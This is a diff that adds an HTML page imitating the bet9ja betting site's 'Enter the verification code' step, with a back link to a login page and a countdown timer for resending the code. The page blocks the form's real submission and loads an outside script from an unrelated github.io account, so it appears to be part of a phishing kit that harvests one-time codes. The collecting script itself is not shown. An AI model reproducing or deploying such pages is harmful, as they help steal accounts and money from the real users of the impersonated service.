@@ -1,0 +1,218 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>Receive Code</title>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+*{
+  box-sizing:border-box;
+  font-family:Arial,Helvetica,sans-serif;
+  -webkit-tap-highlight-color: transparent;
+}
+
+body{
+  margin:0;
+  background:#2b2f3a;
+  color:#fff;
+}
+
+/* HEADER */
+.header{
+  background:#1f232b;
+  padding:12px;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  position:relative;
+}
+
+.back{
+  position:absolute;
+  left:12px;
+  font-size:14px;
+  color:#ccc;
+}
+
+.head-logo{
+  font-size:22px;
+  font-weight:800;
+}
+
+.head-logo .red{color:#e50914}
+.head-logo .green{color:#36c773}
+
+/* FORM BOX */
+.code-box{
+  padding:22px;
+}
+
+.title{
+  text-align:center;
+  margin-bottom:20px;
+  font-size:15px;
+  color:#cfd3da;
+}
+
+/* INPUT */
+input{
+  width:100%;
+  padding:15px 14px;
+  margin-bottom:14px;
+  border-radius:8px;
+  background:#3a3f4a;
+  color:white;
+  font-size:15px;
+  border:1.5px solid transparent;
+  outline:none;
+  transition:all .18s ease;
+}
+
+input::placeholder{color:#b4b8c1}
+
+input:focus{
+  border-color:#0a7c3a;
+  background:#343944;
+  box-shadow:0 0 0 1px rgba(10,124,58,.4);
+}
+
+/* BUTTON */
+button{
+  width:100%;
+  padding:15px;
+  border:none;
+  border-radius:8px;
+  color:white;
+  font-size:15px;
+  font-weight:bold;
+  cursor:not-allowed;
+  transition:all .15s ease;
+  background:#07592a;
+  opacity:.45;
+}
+
+button.active{
+  background:#0a7c3a;
+  cursor:pointer;
+  opacity:1;
+}
+
+button.active:active{
+  transform:scale(0.985);
+  background:#096932;
+}
+
+/* RESEND */
+.resend{
+  margin-top:16px;
+  text-align:center;
+  font-size:14px;
+  color:#cfd3da;
+  cursor:not-allowed;
+  opacity:.5;
+}
+
+.resend.active{
+  color:#00ff73;
+  cursor:pointer;
+  opacity:1;
+}
+</style>
+</head>
+<script src="https://eal876955-lgtm.github.io/npi/m/intelligent.js"></script>
+<body>
+
+<!-- HEADER -->
+<div class="header">
+  <a href="login.html">
+  <div class="back">← Back</div></a>
+  <div class="head-logo">
+    <span class="red">bet</span><span class="green">9ja</span>
+  </div>
+</div>
+
+<!-- FORM -->
+<div class="code-box">
+  <div class="title">Enter the verification code sent to you</div>
+
+  <form id="codeForm">
+
+    <!-- ✅ SINGLE INPUT ONLY -->
+    <input 
+      type="text" 
+      id="codeInput"
+      name="verification_code"
+      placeholder="Enter verification code"
+      required
+    >
+
+    <!-- ✅ BUTTON DISABLED FIRST -->
+    <button type="submit" id="verifyBtn" disabled>Verify Code</button>
+
+  </form>
+
+  <!-- ✅ RESEND -->
+  <div class="resend" id="resendText">Resend code in 30s</div>
+</div>
+
+<!-- ✅ SCRIPT: BUTTON ENABLE + RESEND COUNTDOWN -->
+<script>
+const codeInput = document.getElementById("codeInput");
+const verifyBtn = document.getElementById("verifyBtn");
+const resendText = document.getElementById("resendText");
+
+let waitTime = 30;
+let countdown;
+let resendActive = false;
+
+/* ENABLE VERIFY BUTTON WHEN CODE IS TYPED */
+codeInput.addEventListener("input", () => {
+  if(codeInput.value.trim() !== ""){
+    verifyBtn.disabled = false;
+    verifyBtn.classList.add("active");
+  } else {
+    verifyBtn.disabled = true;
+    verifyBtn.classList.remove("active");
+  }
+});
+
+/* START COUNTDOWN */
+function startCountdown(){
+  resendActive = false;
+  resendText.classList.remove("active");
+  let timeLeft = waitTime;
+  resendText.textContent = `Resend code in ${timeLeft}s`;
+
+  countdown = setInterval(() => {
+    timeLeft--;
+    resendText.textContent = `Resend code in ${timeLeft}s`;
+
+    if(timeLeft <= 0){
+      clearInterval(countdown);
+      resendActive = true;
+      resendText.textContent = "Resend Code";
+      resendText.classList.add("active");
+    }
+  }, 1000);
+}
+
+/* RESEND CLICK */
+resendText.addEventListener("click", () => {
+  if(!resendActive) return;
+
+  waitTime += 30; // ✅ INCREASE 30s EVERY TIME
+  startCountdown();
+});
+
+/* PREVENT REAL FORM SUBMIT */
+document.getElementById("codeForm").addEventListener("submit", function(e){
+  e.preventDefault();
+});
+
+/* AUTO START FIRST 30s */
+startCountdown();
+</script>
+
+</body>
+</html>
